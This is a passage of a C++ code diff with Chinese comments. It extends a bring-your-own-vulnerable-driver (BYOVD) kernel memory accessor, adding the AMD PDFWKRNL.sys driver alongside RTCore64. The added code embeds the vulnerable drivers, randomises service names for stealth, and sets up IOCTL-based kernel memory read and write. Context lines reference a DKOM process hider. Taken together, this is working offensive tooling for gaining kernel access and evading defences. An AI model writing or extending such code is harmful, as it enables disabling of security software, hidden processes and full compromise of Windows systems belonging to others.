-                // 匹配 RTCore64Svc/SysMon (旧格式, 直接匹配)
+                // 匹配 RTCore64Svc/SysMon/PdfwKrnlSvc (旧格式, 直接匹配)
                 bool isStaleSvc = (wcsstr(subKeyName, L"RTCore64Svc") == subKeyName)
-                               || (wcsstr(subKeyName, L"SysMon") == subKeyName);
+                               || (wcsstr(subKeyName, L"SysMon") == subKeyName)
+                               || (wcsstr(subKeyName, L"PdfwKrnlSvc") == subKeyName);  // ★ BUILD 489
                 // ★ v3.110: 也匹配新的随机化服务名前缀
                 // ★ v3.113: 必须检查 _XXXX 后缀, 防止误匹配合法系统服务
                 if (!isStaleSvc) {
@@ -1515,9 +1697,16 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
 
     if (m_hDevice != INVALID_HANDLE_VALUE) {
         // ★ v3.114: 已有设备, 直接用默认 IOCTL 码测试内核读取
-        //   不再调用 ProbeIoctlCode — 硬编码地址探测会导致蓝屏
+        // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
         ByovdDiag("BYOVD:Init: existing device opened, testing with default IOCTL 0x%08X...\n",
             m_driverInfo.ioctlCode);
+        if (g_isPdfwKrnl) {
+            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
+            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
+        } else {
+            g_probedReadIoctl = IOCTL_PHYSICAL_READ;
+            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;
+        }
         m_active = true;
         m_ntosBase = GetNtoskrnlBase();
         if (m_ntosBase) {
@@ -1550,8 +1739,10 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         // 1. 强制移除所有残留的 RTCore64/SysMon 服务
         ForceRemoveRTCore64Services();
 
-        // 2. 删除 DOS 设备符号链接 \\.\RTCore64
-        DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"RTCore64", nullptr);
+        // 2. 删除 DOS 设备符号链接
+        // ★ BUILD 489: 根据驱动类型使用正确的设备名
+        DefineDosDeviceW(DDD_REMOVE_DEFINITION,
+            g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64", nullptr);
 
         // 3. 短暂等待内核释放设备对象
         Sleep(500);
@@ -1583,7 +1774,8 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         if (!zombieRetried) {
             zombieRetried = true;
             ByovdDiag("BYOVD:Init: LoadDriver failed, trying zombie cleanup retry...\n");
-            DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"RTCore64", nullptr);
+            DefineDosDeviceW(DDD_REMOVE_DEFINITION,
+                g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64", nullptr);  // ★ BUILD 489
             Sleep(1000);
             loadOk = LoadDriver(actualServiceName, actualPath);
             ByovdDiag("BYOVD:Init: LoadDriver retry → %d\n", (int)loadOk);
@@ -1600,8 +1792,8 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
             dosName = devPath.substr(4);                // e.g. "RT64_A1B2"
             ntDevName = L"\\Device\\" + dosName;        // e.g. "\\Device\\RT64_A1B2"
         } else {
-            dosName = L"RTCore64";
-            ntDevName = L"\\Device\\RTCore64";
+            dosName = g_isPdfwKrnl ? L"PdfwKrnl" : L"RTCore64";          // ★ BUILD 489
+            ntDevName = g_isPdfwKrnl ? L"\\Device\\PdfwKrnl" : L"\\Device\\RTCore64";
         }
 
         ByovdDiag("BYOVD:Init: LoadDriver FAILED, trying symlink fix: '%ls' → '%ls'\n",
@@ -1614,9 +1806,16 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                 nullptr, OPEN_EXISTING, 0, nullptr);
             if (m_hDevice != INVALID_HANDLE_VALUE) {
-                // ★ v3.114: 直接用默认 IOCTL 码测试, 不再调用 ProbeIoctlCode
+                // ★ BUILD 489: 根据驱动类型设置 IOCTL 码
                 ByovdDiag("BYOVD:Init: zombie device opened after symlink fix, testing IOCTL 0x%08X...\n",
                     m_driverInfo.ioctlCode);
+                if (g_isPdfwKrnl) {
+                    g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
+                    g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;
+                } else {
+                    g_probedReadIoctl = IOCTL_PHYSICAL_READ;
+                    g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;
+                }
                 m_active = true;
                 m_ntosBase = GetNtoskrnlBase();
                 if (m_ntosBase) {
@@ -1675,34 +1874,57 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     ByovdDiag("BYOVD:Init: STEP_B ntos=0x%llX, ioctl=0x%08X\n",
               (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
 
-    // ★ v3.123: 直接使用 IOCTL 0x80002048/0x4C 读写内核VA
-    //   BUILD 407 (v3.109) 已验证此方案正常工作。
-    //   不再尝试 IOCTL 0x80002000 (虚拟内存IOCTL) — 此RTCore64版本不支持。
-    //   不再降级到物理IOCTL + PageTableWalker — 此前导致BSOD。
-    ByovdDiag("BYOVD:Init: STEP_B1 probing IOCTL 0x80002048 (verified working in BUILD 407)...\n");
+    // ★ BUILD 489: 根据驱动类型选择 IOCTL 探测方式
+    //   PDFWKRNL: 使用 IOCTL 0x80002014 memcpy 直接读写内核VA
+    //   RTCore64: 使用 IOCTL 0x80002048 (PhysicalReadViaIOCTL) 直接读写内核VA
+    ByovdDiag("BYOVD:Init: STEP_B1 probing IOCTL (type=%s)...\n",
+        g_isPdfwKrnl ? "PDFWKRNL" : "RTCore64");
     {
-        // 直接设置 IOCTL 码
-        g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
-        g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
-        g_useVirtualIOCTL = false;
+        if (g_isPdfwKrnl) {
+            // ★ BUILD 489: PDFWKRNL — 使用 memcpy IOCTL
+            g_probedReadIoctl = IOCTL_AMDPDFW_MEMCPY;
+            g_probedWriteIoctl = IOCTL_AMDPDFW_MEMCPY;  // 同一个 IOCTL, 方向由参数决定
+            g_useVirtualIOCTL = false;
 
-        // 从 ntoskrnl 头部读取 MZ 签名验证 IOCTL 可用
-        uint8_t testBuf[8] = {};
-        bool ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 2);
-        DWORD err = GetLastError();
-        uint16_t magic = *(uint16_t*)testBuf;
-        ByovdDiag("BYOVD:Init: IOCTL 0x%08X read ntos+0x0 ok=%d err=%u magic=0x%04X (expect 0x5A4D)\n",
-                  g_probedReadIoctl, (int)ok, err, magic);
-        if (ok && magic == 0x5A4D) {
-            ByovdDiag("BYOVD:Init: IOCTL 0x%08X OK — kernel VA R/W via physical IOCTL\n",
-                      g_probedReadIoctl);
+            uint8_t testBuf[8] = {};
+            bool ok = PdfwReadKernelVA(m_hDevice, m_ntosBase, testBuf, 2);
+            DWORD err = GetLastError();
+            uint16_t magic = *(uint16_t*)testBuf;
+            ByovdDiag("BYOVD:Init: PDFW IOCTL 0x%08X read ntos+0x0 ok=%d err=%u magic=0x%04X (expect 0x5A4D)\n",
+                      IOCTL_AMDPDFW_MEMCPY, (int)ok, err, magic);
+            if (ok && magic == 0x5A4D) {
+                ByovdDiag("BYOVD:Init: PDFW IOCTL OK — kernel VA memcpy R/W\n");
+            } else {
+                ByovdDiag("BYOVD:Init: PDFW IOCTL FAILED — driver unusable\n");
+                CloseHandle(m_hDevice);
+                m_hDevice = INVALID_HANDLE_VALUE;
+                UnloadDriver(m_actualServiceName);
+                return false;
+            }
         } else {
-            ByovdDiag("BYOVD:Init: IOCTL 0x%08X FAILED — driver unusable\n",
-                      g_probedReadIoctl);
-            CloseHandle(m_hDevice);
-            m_hDevice = INVALID_HANDLE_VALUE;
-            UnloadDriver(m_actualServiceName);
-            return false;
+            // 直接设置 IOCTL 码
+            g_probedReadIoctl = IOCTL_PHYSICAL_READ;   // 0x80002048
+            g_probedWriteIoctl = IOCTL_PHYSICAL_WRITE;  // 0x8000204C
+            g_useVirtualIOCTL = false;
+
+            // 从 ntoskrnl 头部读取 MZ 签名验证 IOCTL 可用
+            uint8_t testBuf[8] = {};
+            bool ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 2);
+            DWORD err = GetLastError();
+            uint16_t magic = *(uint16_t*)testBuf;
+            ByovdDiag("BYOVD:Init: IOCTL 0x%08X read ntos+0x0 ok=%d err=%u magic=0x%04X (expect 0x5A4D)\n",
+                      g_probedReadIoctl, (int)ok, err, magic);
+            if (ok && magic == 0x5A4D) {
+                ByovdDiag("BYOVD:Init: IOCTL 0x%08X OK — kernel VA R/W via physical IOCTL\n",
+                          g_probedReadIoctl);
+            } else {
+                ByovdDiag("BYOVD:Init: IOCTL 0x%08X FAILED — driver unusable\n",
+                          g_probedReadIoctl);
+                CloseHandle(m_hDevice);
+                m_hDevice = INVALID_HANDLE_VALUE;
+                UnloadDriver(m_actualServiceName);
+                return false;
+            }
         }
     }
 
@@ -1722,17 +1944,20 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     m_active = true;
     ByovdDiag("BYOVD:Init: STEP_D m_active=true, verifying IOCTL...\n");
 
-    // ★ v3.124: 验证 IOCTL R/W 可用 — 使用 PhysicalReadViaIOCTL (0x80002048)
-    //   之前使用了 VirtualReadViaIOCTL (0x80002000) 做验证, 但此RTCore64版本不支持,
-    //   导致验证失败后卸载驱动, 虽已成功打开物理IOCTL却功亏一篑。
+    // ★ BUILD 489: 验证 IOCTL R/W 可用 — 根据驱动类型使用对应方法
     {
         uint8_t testBuf[8] = {};
-        bool ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 8);
+        bool ok;
+        if (g_isPdfwKrnl) {
+            ok = PdfwReadKernelVA(m_hDevice, m_ntosBase, testBuf, 8);
+        } else {
+            ok = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, m_ntosBase, testBuf, 8);
+        }
         uint32_t readVal = *(uint32_t*)testBuf;
-        ByovdDiag("BYOVD:Init: STEP_E PhysicalReadViaIOCTL(ntos+0x0)=%d val=0x%08X\n",
-                  (int)ok, readVal);
+        ByovdDiag("BYOVD:Init: STEP_E %s IOCTL verify(ntos+0x0)=%d val=0x%08X\n",
+                  g_isPdfwKrnl ? "PDFW" : "PhysicalRead", (int)ok, readVal);
         if (!ok || readVal == 0 || readVal == 0xFFFFFFFF) {
-            ByovdDiag("BYOVD:Init: Physical IOCTL verify FAILED (val=0x%08X)\n", readVal);
+            ByovdDiag("BYOVD:Init: IOCTL verify FAILED (val=0x%08X)\n", readVal);
             m_active = false;
             CloseHandle(m_hDevice);
             m_hDevice = INVALID_HANDLE_VALUE;
@@ -2381,10 +2606,11 @@ bool DKOMProcessHider::UnhideProcess() {
 static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original) {
     // ★ v3.96: 不再修改驱动二进制 — 任何 PE 修改 (设备名补丁/签名剥离/时间戳)
     //   都会触发 Windows 内核的 STATUS_INVALID_IMAGE_HASH (0xC0000428)。
-    //   改为使用原始未修改驱动 + 原始设备名 \\.\RTCore64,
+    //   改为使用原始未修改驱动 + 原始设备名,
     //   通过 SCM 清理 + DefineDosDeviceW 修复僵尸设备来避免冲突。
     //
     //   仅随机化服务名 (注册表唯一性), 驱动内容保持原样。
+    // ★ BUILD 489: 支持 PDFWKRNL.sys (设备名 \\.\PdfwKrnl)
 
     // 生成 4 位随机 hex 标识符
     WORD seed = (WORD)(GetTickCount() ^ (GetCurrentProcessId() & 0xFFFF) ^ GetCurrentThreadId());
@@ -2405,6 +2631,10 @@ static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original)
     if (original.driverPath == L"RTCore64.sys") {
         embedData = stealth::embedded::RTCore64_data;
         embedSize = stealth::embedded::RTCore64_size;
+    } else if (original.driverPath == L"PDFWKRNL.sys") {
+        // ★ BUILD 489: PDFWKRNL.sys 嵌入支持
+        embedData = stealth::embedded::PDFWKRNL_data;
+        embedSize = stealth::embedded::PDFWKRNL_size;
     }
     ByovdDiag("BYOVD:Mutate: embedData=0x%p embedSize=%zu\n", embedData, embedSize);
 
